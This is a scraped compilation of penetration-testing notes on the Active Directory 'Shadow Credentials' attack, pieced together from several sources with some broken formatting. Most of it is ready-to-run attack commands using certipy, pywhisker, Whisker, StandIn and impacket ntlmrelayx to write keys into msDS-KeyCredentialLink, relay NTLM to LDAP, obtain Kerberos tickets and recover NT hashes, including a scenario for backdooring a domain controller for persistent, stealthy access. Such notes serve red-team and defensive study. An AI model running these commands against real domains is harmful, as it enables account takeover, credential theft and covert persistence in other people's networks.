

##
#
https://pentest.party/notes/ad/shadow-credentials
#
https://github.com/topotam/PetitPotam
#
https://github.com/ShutdownRepo/pywhisker
#
https://k4713.medium.com/k4713-on-shadow-credentials-attack-57474d84ef69
#
https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
#
https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory
#
##

Shadow Credentials 
06.03.2024 · dadevel

It is possible to add Key Credentials to the msDS-KeyCredentialLink attribute of the target user or computer object and then perform Kerberos authentication as that account using PKINIT. source

Shadow Credentials require Windows Server 2016 domain functional level or higher.

Abuse GenericWrite on a user object (jdoeadm) to add a key credential and retrieve the certificate. Now you can authenticate as the user via PKINIT. If you got computer instead, you can impersonate a domain admin on that computer trough Delegate2Thyself / S4U2self.

certipy
Add a new key credential, authenticate via PKINIT, Unpac the Hash and remove the key credential in one go.

certipy shadow auto -u jdoe@corp.local -p 'passw0rd' -account jdoeadm
pywhisker
Clean up.

pywhisker
The device UUID is printed by the command above.

pywhisker -d corp.local -u jdoe -k --no-pass -t jdoeadm --action remove --device-id $uuid
certipy
NTLM relay to LDAP and open an interactive LDAP shell (source). When relaying a computer account the shadow target should be the SAM account name, e.g. ws01$.

impacket
Requires PR 1402.
```
impacket-ntlmrelayx --no-dump --no-da --no-acl --no-validate-privs --no-smb-server --no-wcf-server --no-raw-server --http-port 8080 --interactive --target ldaps://dc01.corp.local
$ nc -v 127.0.0.1 11000
# set_shadow_creds jdoeadm
# clear_shadow_creds jdoeadm
# exit
```
NTLM relay to LDAP. Requires manual cleanup.

impacket
```
impacket-ntlmrelayx --no-dump --no-da --no-acl --no-validate-privs --no-smb-server --no-wcf-server --no-raw-server --http-port 8080 --shadow-credentials --shadow-target jdoeadm --target ldaps://dc01.corp.local
```
Untested tools:

Whisker, written in C#

##
##

Shadow Credentials
Theory
The Kerberos authentication protocol works with tickets in order to grant access. An ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). 
That prior TGT can only be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, 
making them vulnerable to ASREProast). The pre-authentication can be validated symmetrically (with a DES, RC4, AES128 or AES256 key) or asymmetrically (with certificates).
The asymmetrical way of pre-authenticating is called PKINIT.

The client has a public-private key pair, and encrypts the pre-authentication data with their private key, and the KDC decrypts it with the client’s public key. The KDC also has a public-private key pair, allowing for the exchange of a session key. (specterops.io)

Active Directory user and computer objects have an attribute called msDS-KeyCredentialLink where raw public keys can be set. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.

There are multiple scenarios where an attacker can have control over an account that has the ability to edit the msDS-KeyCredentialLink (a.k.a. "kcl") attribute of other objects (e.g. member of a special group, has powerful ACEs, etc.). This allows attackers to create a key pair, append to raw public key in the attribute, and obtain persistent and stealthy access to the target object (can be a user or a computer).

Practice
In order to exploit that technique, the attacker needs to:

be in a domain that supports PKINIT and containing at least one Domain Controller running Windows Server 2016 or above.

be in a domain where the Domain Controller(s) has its own key pair (for the session key exchange) (e.g. happens when AD CS is enabled or when a certificate authority (CA) is in place).

have control over an account that can edit the target object's msDs-KeyCredentialLink attribute.

The msDS-KeyCredentialLink feature was introduced with Windows Server 2016. However, this is not to be confused with PKINIT which was already present in Windows 2000. The msDS-KeyCredentialLink feature allows to link an X509 certificate to a domain object, that's all.

If those per-requisites are met, an attacker can

create an RSA key pair

create an X509 certificate configured with the public key

create a KeyCredential structure featuring the raw public key and add it to the msDs-KeyCredentialLink attribute

authenticate using PKINIT and the certificate and private key

UNIX-like
Windows
From UNIX-like systems, the msDs-KeyCredentialLink attribute of a user or computer target can be manipulated with the pyWhisker tool.

```
pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "list"
```
The "add" action from pywhisker is featured in ntlmrelayx.

```
ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'
```
When the public key has been set in the msDs-KeyCredentialLink of the target, the certificate generated can be used with Pass-the-Certificate to obtain a TGT and further access.

Nota bene

User objects can't edit their own msDS-KeyCredentialLink attribute while computer objects can. 
This means the following scenario could work: trigger an NTLM authentication from DC01, 
relay it to DC02, make pywhisker edit DC01's attribute to create a Kerberos PKINIT pre-authentication backdoor on it, 
and have persistent access to DC01 with PKINIT and pass-the-cache.

Computer objects can only edit their own msDS-KeyCredentialLink attribute if KeyCredential is not set already.

Resources
https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
posts.specterops.io

##
##


Key Credentials Abuse
"...if you can write to the msDS-KeyCredentialLink property of a user, you can retrieve the NT hash of that user." (Elad Shamir, ref)

That makes GenericWrite on a user effectively equal to DCSync right on that user.

Remember that WriteDacl != GenericWrite, so in order to modify msDS-KeyCredentialLink, obtain necessary privileges first. For example, using StandIn:

```
Cmd > Rubeus.exe createnetonly /program:cmd.exe /show /ticket:tgt.kirbi
Cmd > StandIn.exe --domain megacorp.local --object "samaccountname=snovvcrash" --grant "MEGACORP\jdoe" --type GenericAll
DSInternals
https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Get-ADKeyCredential.md

Whisker
https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab

https://github.com/eladshamir/Whisker
```
List all the values of the the msDS-KeyCredentialLink attribute of a target object:

```
Cmd > .\Whisker.exe list /target:ws01$ /domain:megacorp.local /dc:DC1.megacorp.local
Add a new value to the msDS-KeyCredentialLink attribute of a target object:

Cmd > .\Whisker.exe add /target:ws01$ /domain:megacorp.local /dc:DC1.megacorp.local /path:C:\Temp\cert.pfx /password:Passw0rd!
Remove a value from the msDS-KeyCredentialLink attribute of a target object:

Copy
Cmd > .\Whisker.exe remove /target:ws01$ /domain:megacorp.local /dc:DC1.megacorp.local /deviceid:00ff00ff-00ff-00ff-00ff-00ff00ff00ff
Clear all the values of the the msDS-KeyCredentialLink attribute of a target object:

Copy
Cmd > .\Whisker.exe clear /target:ws01$ /domain:megacorp.local /dc:DC1.megacorp.local 
pywhisker
https://github.com/ShutdownRepo/pywhisker
```
https://podalirius.net/en/articles/parsing-the-msds-keycredentiallink-value-for-shadowcredentials-attack/

```
$ python3 pywhisker.py -d megacorp.local -u svc_mssql -p 'Passw0rd!' --target sqltest --action list
$ python3 pywhisker.py -d megacorp.local -u svc_mssql -p 'Passw0rd!' --target sqltest --action add -f sqltest_cert
$ python3 pywhisker.py -d megacorp.local -u svc_mssql -p 'Passw0rd!' --target sqltest --action list
$ python3 pywhisker.py -d megacorp.local -u svc_mssql -p 'Passw0rd!' --target sqltest --action clear
$ python3 gettgtpkinit.py megacorp.local/sqltest -cert-pfx ~/tools/pywhisker/sqltest_cert.pfx -pfx-pass 3Dc3Er0rst2e9J1yRtjh sqltest.ccache
$ KRB5CCNAME=sqltest.ccache python3 getnthash.py megacorp.local/sqltest -key 00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff
